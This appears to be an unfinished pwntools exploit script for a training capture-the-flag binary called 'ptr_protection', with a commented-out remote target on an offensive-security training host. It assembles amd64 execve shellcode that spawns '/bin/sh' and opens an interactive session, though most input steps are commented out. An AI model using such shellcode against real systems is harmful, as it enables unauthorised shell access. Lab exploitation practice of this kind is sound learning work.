from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = process("./ptr_protection")
gdb.attach(r,'''
''')
#input("wait")
#r = remote("bin.training.offdef.it", 3001)


asm_code = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x404080
add rdi, 0x20
syscall
"""
context.arch = 'amd64'
stringa = "/bin/sh"
shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")

# input("wait")
# r.sendline(b"\x29")
# time.sleep(0.1)
# r.sendline(b'A')

# time.sleep(0.1)
# r.sendline(b"\x2a")
# time.sleep(0.1)
# r.sendline(b'A')

# time.sleep(0.1)
# r.sendline(b"\x2b")
# time.sleep(0.1)
# r.sendline(b'A')

# time.sleep(0.1)
# r.sendline(b"\x2c")
# time.sleep(0.1)
# r.sendline(b'A')

# time.sleep(0.1)
# r.sendline(b"\x2d")
# time.sleep(0.1)
# r.sendline(b'A')

# time.sleep(0.1)
# r.sendline(b"\x2e")
# time.sleep(0.1)
# r.sendline(b'A')

# time.sleep(0.1)
# r.sendline(b"\x2f")
# time.sleep(0.1)
# r.sendline(b'A')
# time.sleep(0.1)

# r.sendline(b"\xff\xff\xff\xff\xff\xff\xff\xff")

r.interactive()